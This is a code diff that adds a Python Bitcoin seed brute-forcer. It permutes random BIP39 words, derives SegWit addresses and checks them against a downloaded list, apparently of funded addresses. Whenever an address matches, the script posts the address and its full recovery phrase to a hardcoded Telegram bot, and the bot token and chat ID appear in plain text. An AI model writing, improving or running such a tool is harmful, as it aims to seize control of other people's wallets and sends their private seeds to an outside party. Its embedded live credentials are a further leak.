@@ -1,0 +1,196 @@
+import os
+import itertools
+import random
+from mnemonic import Mnemonic
+import hashlib
+from bip32utils import BIP32Key
+import bech32
+import mmap
+import time
+import math
+import multiprocessing
+import requests
+import urllib.request
+from typing import List
+
+M         = Mnemonic("english")
+H         = 0x80000000 
+F         = "0"
+cpu_count = multiprocessing.cpu_count()
+
+
+file_url = f"https://github.com/JikkkoNikiGFD1930/0/releases/download/v0/{F}"
+
+def format_size(bytes_size):
+    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+        if bytes_size < 1024:
+            return f"{bytes_size:.2f} {unit}"
+        bytes_size /= 1024
+
+if not os.path.exists(F):
+    print("🔴 File not found. Downloading...")
+    urllib.request.urlretrieve(file_url, F)
+    file_size = format_size(os.path.getsize(F))
+    print(f"✅ Download complete. File Size: {file_size}")
+    
+if not os.path.exists(F):
+    print("🏁 File Not Downloaded! 🔴")
+    exit()
+
+def wordsINorder( mnemo ):
+    indexed_words = []
+    for word in mnemo:
+        if word in M.wordlist:
+            index = M.wordlist.index(word)
+            indexed_words.append((word, index))
+    indexed_words.sort(key=lambda x: x[1])
+    str = []
+    for word, index in indexed_words:
+        str.append(f"{word}({index+1})")
+    output = "🏁 " + ("|".join(str))
+    print( output )
+    return output
+def encode_segwit_address(pubkey_hash):
+    witness_version = 0
+    witprog = bech32.convertbits(pubkey_hash, 8, 5)
+    return bech32.bech32_encode("bc", [witness_version] + witprog)
+def make(words):
+    seed = M.to_seed(words)
+    bip32_root_key = BIP32Key.fromEntropy(seed)
+    bip32_child_key = bip32_root_key.ChildKey(84 + H) \
+                                .ChildKey(0 + H) \
+                                .ChildKey(0 + H) \
+                                .ChildKey(0) \
+                                .ChildKey(0)
+    public_key = bip32_child_key.PublicKey()
+    sha256_hash = hashlib.sha256(public_key).digest()
+    ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
+    segwit_address = encode_segwit_address(ripemd160_hash)
+    # print("Mnemonic:", words)
+    # print("Public Key (HEX):", public_key.hex())
+    # print("Bitcoin Address:", segwit_address)
+    return segwit_address
+def search( address, P ):
+    # print( address )
+    # start_time   = time.time()
+    result       = search_in_memory(f"{ address[3:15] }")
+    # elapsed_time = time.time() - start_time
+    # print(f"{result} Elapsed time: {elapsed_time:.6f} seconds")
+    if(result):
+        print(f"✅ Found {address}\n{P}")
+        notify(f"✅ Found {address}\n{P}")
+        return result
+    # else:
+        # print("🔴 NotFound")
+    return False
+    
+def load_file_into_memory(file_path):
+    with open(file_path, 'r+b') as f:
+        return mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+mmap_obj = load_file_into_memory(F)
+def search_in_memory(search_term):
+    search_bytes = search_term.encode('utf-8')
+    pos = mmap_obj.find(search_bytes)
+    if pos != -1:
+        return True
+    return False
+
+def notify(msg, type="success", retries=5, delay=2):
+    for attempt in range(retries):
+        try:
+            if type == 'success':
+                requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/sendMessage", data={"chat_id": "567639577","text": msg,"parse_mode": "Markdown"})
+            else:
+                requests.post("https://api.telegram.org/bot7306877915:AAHR-EDl87kj1eiLVWUxyiHnaQoiJUTW8Fc/sendMessage", data={"chat_id": "567639577","text": msg,"parse_mode": "Markdown"})
+        except Exception as e:
+            print(f"⚠️ Telegram Connection failed [notify_{type}] (Attempt {attempt + 1}/{retries}): {e}")
+            if attempt < retries - 1:
+                time.sleep(delay)
+            else:
+                print(f"❌ Telegram Max retries reached. [notify_{type}]")
+                print("Message was:")
+                print(msg)
+                return None
+
+def worker(prefixes: List[tuple], data: List[int]):
+    # print( "[worker] Core Share: ", s(prefixes), (data) )
+    valid = []
+    MAX = 100
+    Attemps = 0
+    for prefix in prefixes:
+        rest = [x for x in data if x not in prefix]
+        if Attemps >= MAX:
+            break
+        for p in itertools.permutations(rest):
+            mnemonic = " ".join( prefix + p ).strip()
+            # print(mnemonic)
+            Attemps += 1
+            if M.check(mnemonic):
+                valid.append(mnemonic)
+                # search( make(mnemonic), mnemonic 
+            
+            if Attemps >= MAX:
+                break
+    return valid
+
+
+def search_worker( words ):
+    for m in words:
+        search( make(m), m )
+
+def split_data_evenly(data, num_chunks):
+    avg_size = len(data) // num_chunks
+    remainder = len(data) % num_chunks
+    chunks = []
+    start = 0
+
+    for i in range(num_chunks):
+        end = start + avg_size + (1 if i < remainder else 0)
+        chunks.append(data[start:end])
+        start = end
+
+    return chunks
+
+def start():
+    selected_words = random.sample(M.wordlist, 12)
+    WIO = wordsINorder( selected_words )
+    # notify(f"🏁 Using {cpu_count} CPU CORES\n{WIO}")
+    data = selected_words
+    prefix_pairs = list(itertools.permutations(data, 2))
+
+    chunks = [[] for _ in range(cpu_count)]
+    for i, p in enumerate(prefix_pairs):
+        chunks[i % cpu_count].append(p)
+
+    start_time = time.time()
+
+    with multiprocessing.Pool(cpu_count) as pool:
+        results = pool.starmap(worker, [(chunk, data) for chunk in chunks])
+    
+    valid_seeds = [item for sublist in results for item in sublist]
+    
+    all_perms = math.factorial( len(selected_words) )
+    
+
+    chunks = split_data_evenly(valid_seeds, cpu_count) 
+    
+    with multiprocessing.Pool(cpu_count) as pool:
+        pool.map(search_worker, chunks)
+        
+    end_time = time.time()
+
+    if len(valid_seeds) > 0:
+        output = f"✅ [%{ round( len(valid_seeds)/all_perms * 100 ) } VALID] | found {len(valid_seeds):,} valid seeds amoung {all_perms:,} | Generated in {end_time - start_time:.2f} seconds"
+        print(output)
+    else:
+        output = f"✅ {(all_perms):,} Generated in {end_time - start_time:.2f} seconds"
+        print(output)
+
+    #Edit that message, instead of making another [CHATGPT]
+    # notify(f"🏁 Using {cpu_count} CPU CORES\n{WIO}\n{output}")
+
+if __name__ == '__main__':
+    print(f"🏁 Using {cpu_count} CPU CORES")
+    start()
+    mmap_obj.close()
+    print("🏁 Done")
